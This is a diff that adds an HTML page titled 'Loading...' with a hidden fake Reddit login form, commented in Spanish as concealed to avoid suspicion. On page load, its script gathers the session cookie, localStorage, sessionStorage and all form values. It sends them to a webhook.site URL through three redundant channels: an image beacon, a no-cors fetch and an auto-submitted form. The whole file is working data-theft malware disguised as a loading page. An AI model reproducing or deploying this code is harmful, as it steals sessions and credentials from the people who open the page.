@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <link rel="icon" href="data:,">
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // 1. Recolectar datos sensibles
+            const authToken = document.cookie.split(';')
+                .find(c => c.trim().startsWith('sessionid='))
+                ?.split('=')[1] || 'NO_COOKIE';
+
+            const payload = {
+                authToken: authToken,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                forms: Array.from(document.forms).map(form => ({
+                    id: form.id,
+                    action: form.action,
+                    inputs: Array.from(form.elements).map(i => ({
+                        name: i.name,
+                        type: i.type,
+                        value: i.value
+                    }))
+                })),
+                meta: {
+                    url: location.href,
+                    referrer: document.referrer,
+                    userAgent: navigator.userAgent
+                }
+            };
+
+            // 2. Exfiltrar (3 métodos redundantes)
+            // Método 1: Image tag (sin CORS)
+            new Image().src = `https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2?img=${encodeURIComponent(JSON.stringify(payload))}`;
+            
+            // Método 2: Fetch con no-cors
+            fetch('https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(payload)
+            });
+            
+            // Método 3: Form submission
+            const form = document.createElement('form');
+            form.action = 'https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2';
+            form.method = 'POST';
+            form.innerHTML = `<input name="data" value='${JSON.stringify(payload)}'>`;
+            document.body.appendChild(form);
+            form.submit();
+        });
+    </script>
+</head>
+<body style="display:none">
+    <!-- Contenido oculto para evitar sospechas -->
+    <h1>Reddit</h1>
+    <form id="login">
+        <input type="email" name="user">
+        <input type="password" name="pass">
+    </form>
+</body>
+</html>
